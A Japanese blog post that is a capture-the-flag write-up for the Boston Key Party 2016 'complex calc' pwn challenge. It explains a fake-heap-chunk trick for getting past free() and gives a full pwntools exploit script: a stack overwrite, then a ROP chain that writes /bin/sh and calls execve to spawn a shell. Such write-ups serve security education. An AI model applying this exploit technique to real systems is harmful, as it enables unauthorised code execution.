---
layout: post
redirect_from:
  - /writeup/ctf/2016/boston-key-party-2016-complex-calc/
  - /blog/2017/03/07/boston-key-party-2016-complex-calc/
date: "2017-03-07T15:50:38+09:00"
tags: [ "ctf", "writeup", "pwn", "boston-key-party-ctf", "heap" ]
"target_url": [ "https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/complex-calc-5" ]
---

# Boston Key Party CTF 2016: complex calc

適当にそれっぽくしてたらいつの間にか解けた。

## problem

[Boston Key Party CTF 2016: simple calc](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/simple-calc-5)の続き。

バイナリはほぼ一致していて、以下だけが異なる。
これによりstackが壊れた後の`free(buf);`を`free(NULL);`にしてやり過ごすことができない。

```
$ diff <(objdump -d -M intel simple-calc) <(objdump -d -M intel complex-calc)
2c2
< simple-calc:     file format elf64-x86-64
---

# Boston Key Party CTF 2016: complex calc
> complex-calc:     file format elf64-x86-64
22761,22762c22761,22762
<   4156e0:	48 85 ff             	test   rdi,rdi
<   4156e3:	0f 84 af 00 00 00    	je     415798 <__cfree+0xc8>
---

# Boston Key Party CTF 2016: complex calc
>   4156e0:	0f 1f 00             	nop    DWORD PTR [rax]
>   4156e3:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
```

## solution

addressが既知な適当な位置に`free`に渡せるchunkっぽい構造を作る必要がある。

書き込みが可能のそのような空間は計算の仮定で使われる以下の静的変数のみである。
ここに作る。

``` c
int add [3]; // 0x6c4a80
int divv[3]; // 0x6c4a90
int mul [3]; // 0x6c4aa0
int sub [3]; // 0x6c4ab0
```

まず先頭の`add`に$33$ (chunk size $32$byte + `PREV_INUSE` bit $1$)を書き込む。
次のchunkが位置することになる`divv`, `mul`, `sub`のあたりは、`PREV_INUSE`を真にするため適当な奇数で埋めておく。
これで通る。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
# parser.add_argument('host', nargs='?', default='localhost')
# parser.add_argument('port', nargs='?', default=8000, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='complex-calc')
args = parser.parse_args()
context.log_level = args.log_level
elf = ELF(args.binary)

# int add [3]; 0x6c4a80
# int divv[3]; 0x6c4a90
# int mul [3]; 0x6c4aa0
# int sub [3]; 0x6c4ab0

# p = remote(args.host, args.port)
p = process(args.binary)
p.recvuntil('Expected number of calculations: ')
p.sendline('255')
def calc(op, x, y):
    p.recvuntil('=> ')
    p.sendline(str({ '+': 1, '-': 2, '*': 3, '/': 4 }[op]))
    p.recvuntil('Integer x: ')
    p.sendline(str(x))
    p.recvuntil('Integer y: ')
    p.sendline(str(y))
def write64(value):
    for z in [ u32(p64(value)[:4]), u32(p64(value)[4:]) ]:
        for x in range(0x100):
            y = (x - z) % 0x100000000
            if x >= 40 and y >= 40:
                calc('-', x, y)
                break
        else:
            assert False

write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(u64('AAAAAAAA'))
write64(0x6c4a90) # free
write64(u64('AAAAAAAA'))
write64(1) # rbp

# write /bin/sh
write64(0x401b73) # pop rdi ; ret
write64(0x006c2000 - 8)
write64(0x44db34) # pop rax ; ret
write64(u64('/bin/sh\0'))
write64(0x40dc26) # mov qword ptr [rdi + 8], rax ; ret

# sys_execve
write64(0x401b73) # pop rdi ; ret
write64(0x006c2000)
write64(0x401c87) # pop rsi ; ret
write64(0)
write64(0x437a85) # pop rdx ; ret
write64(0)
write64(0x44db34) # pop rax ; ret
write64(59) # sys_execve
write64(0x4648e5) # syscall

# make chunk
calc('+', 40+33, -40)
calc('-', 41, 41)
calc('/', 41, 41)
calc('*', 41, 41)

p.recvuntil('=> ')
p.sendline('5')
time.sleep(1)
p.sendline('id')
p.interactive()
```
